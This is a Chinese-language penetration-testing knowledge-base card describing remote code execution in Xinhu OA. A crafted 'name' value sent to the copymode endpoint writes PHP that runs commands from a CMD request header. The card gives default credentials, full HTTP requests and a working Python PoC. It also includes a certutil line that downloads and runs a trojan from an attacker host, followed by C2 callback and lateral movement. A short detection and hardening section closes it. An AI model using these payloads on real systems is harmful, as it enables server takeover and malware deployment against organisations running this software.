---
id: web-php-rce-xinhu-oa-copymode-file-write
title: 信呼 OA copymode 任意文件写入：name 拼接 PHP 代码并访问 Model.php 执行
type: scenario
domain: web
path: web/php/rce
technique: xinhu-oa-copymode-file-write-rce
tags:
- php
- oa
- xinhu
- copymode
- file-write
- rce
- http-header
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V61
  verified_at: '2026-11-05T12:24:21+08:00'
  notes: 已对照原文与图04/05/09/10核对：fscan 识别 172.55.2.23 为信呼协同办公系统(图09)；原 exp 用 PHPSESSID 调 POST /index.php?d=main&m=flow&a=copymode&ajaxbool=true（id=1、name=w{};passthru(getenv(chr(72)...chr(68)));class w），再 GET /webmain/model/flow/<urlencoded-name>Model.php 并带 CMD 头执行；chr 序列解码为 HTTP_CMD，卡内一致；默认口令 xiaoqiao/123456 与 oa.exe 上线 CS 亦与原文一致(图10)。未验证点：card 未展示 copymode 生成文件的实际内容，name 拼接写入路径由 exp 行为推断；PoC 未本机复跑；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/php/rce/web-php-rce-xinhu-oa-copymode-file-write/
draft: false
kb_aliases:
- 信呼 OA copymode
- 信呼 OA 任意文件写入
- copymode Model.php RCE
- HTTP_CMD passthru
- OA 默认口令 xiaoqiao
- PHP 文件写入 getenv 执行
---

## 一句话结论

信呼 OA 的 `copymode` 接口把用户提交的 `name` 拼进生成的 PHP 模型文件名/类名并写入 `webmain/model/flow/`；攻击者用默认口令登录后，把 `name` 构造为 `w{};passthru(getenv("HTTP_CMD"));class w`，再访问生成的 `Model.php` 并在 `CMD` 头传入命令，即可执行任意系统命令。

## 原理

- 信呼 OA 的流程管理提供 `copymode`（复制模式）功能：`POST /index.php?d=main&m=flow&a=copymode&ajaxbool=true`，参数 `id` 选择模板、`name` 作为新模型名。
- 后端把 `name` 直接拼进 PHP 代码/文件名，生成 `webmain/model/flow/<name>Model.php`；由于没有对 `name` 做字符过滤，攻击者可以闭合原有类定义并插入自己的 PHP 语句。
- 文章使用的注入串为：
  ```php
  w{};passthru(getenv(chr(72).chr(84).chr(84).chr(80).chr(95).chr(67).chr(77).chr(68)));class w
  ```
  `chr(...)` 拼接出 `HTTP_CMD`，即读取 HTTP 请求头 `CMD` 的值并交给 `passthru` 执行；前后的 `class w` 用于让生成的 PHP 语法保持可解析。
- 生成的 `Model.php` 可通过 `webmain/model/flow/` 直接访问；因为文件本身是合法 PHP，访问时就会执行注入代码。
- 前置的默认口令 `xiaoqiao/123456` 让攻击者无需漏洞即可登录低权限账号，配合 `copymode` 的写入权限形成完整 RCE。

## 触发条件

- 目标为信呼 OA，且 `copymode` 功能对当前登录用户可用（默认口令或弱口令即可）。
- `webmain/model/flow/` 目录可被 Web 进程写入，且生成的 `Model.php` 可被 Web 访问。
- PHP 未禁用 `passthru`/`getenv` 等函数；`CMD` 请求头可到达 PHP。
- 攻击者能获取有效 `PHPSESSID`。

## 利用步骤

1. 用默认/弱口令登录，获取 `PHPSESSID`：
   ```text
   xiaoqiao / 123456
   ```
2. 调用 `copymode` 写入恶意模型：
   ```http
   POST /index.php?d=main&m=flow&a=copymode&ajaxbool=true HTTP/1.1
   Cookie: PHPSESSID=<session>
   Content-Type: application/x-www-form-urlencoded

   id=1&name=w{};passthru(getenv(chr(72).chr(84).chr(84).chr(80).chr(95).chr(67).chr(77).chr(68)));class w
   ```
3. URL 编码 `name` 后访问生成的模型文件，并在 `CMD` 头传入命令：
   ```http
   GET /webmain/model/flow/<urlencoded-name>Model.php HTTP/1.1
   Cookie: PHPSESSID=<session>
   CMD: whoami
   ```
4. 用 `certutil` 下载并执行木马：
   ```text
   CMD: certutil.exe -urlcache -split -f http://attacker/oa.exe oa.exe
   CMD: oa.exe oa.txt
   ```
5. 上线 C2 后继续本地提权/横向。

## PoC

```python
import requests, urllib.parse

base = "http://target"
s = requests.Session()
s.cookies.set("PHPSESSID", "<session>")

name = 'w{};passthru(getenv(chr(72).chr(84).chr(84).chr(80).chr(95).chr(67).chr(77).chr(68)));class w'
r = s.post(f"{base}/index.php?d=main&m=flow&a=copymode&ajaxbool=true",
           data={"id": "1", "name": name})
print(r.text)

url = f"{base}/webmain/model/flow/{urllib.parse.quote(name, safe='')}Model.php"
print(s.get(url, headers={"CMD": "whoami"}).text)
```

```text
# 生成文件路径
webmain/model/flow/<name>Model.php
# 执行时读取 CMD 头
CMD: certutil.exe -urlcache -split -f http://attacker/oa.exe oa.exe
```

## 变体与关联

- 变体：`name` 可换成其他 PHP 代码（`system`、`assert`、`$_REQUEST`），或直接写一句话木马；也可利用其他拼接 `name` 的流程功能。
- 变体：若 `copymode` 需要更高权限，先通过默认口令/弱口令/越权获取管理员会话。
- 变体：命令执行后可用 certutil/PowerShell 下载木马，或直接反弹 shell。
- 关联：[[pentest-c2-signed-luajit-loader-shellcode-edr-evasion]]（Windows 上线后的免杀执行）、[[web-generic-file-upload-multipart-filename-traversal-ssh-key]]（另一类任意文件写入）。
- 边界：目标已修复/过滤 `name`、`webmain/model/flow/` 不可写、PHP 禁用相关函数、或会话权限不足时，利用失败。

## 检测与防御

- 检测：`copymode` 请求的 `name` 含 `{`、`}`、`;`、`passthru`、`getenv`、`chr(` 等特征；`webmain/model/flow/` 出现异常新增 PHP；访问 `Model.php` 时带自定义 `CMD`/`X-CMD` 头；OA 进程创建 `cmd.exe`/`certutil.exe` 子进程。
- 修复：升级信呼 OA 到修复版本；对 `name` 做严格白名单（仅字母数字下划线），禁止拼接进 PHP 代码/文件名；`copymode` 增加权限校验。
- 加固：修改默认口令；`webmain/model/flow/` 禁止 Web 直接访问或设为只读；禁用不必要的高危 PHP 函数；监控 OA 目录文件变更与异常命令执行。
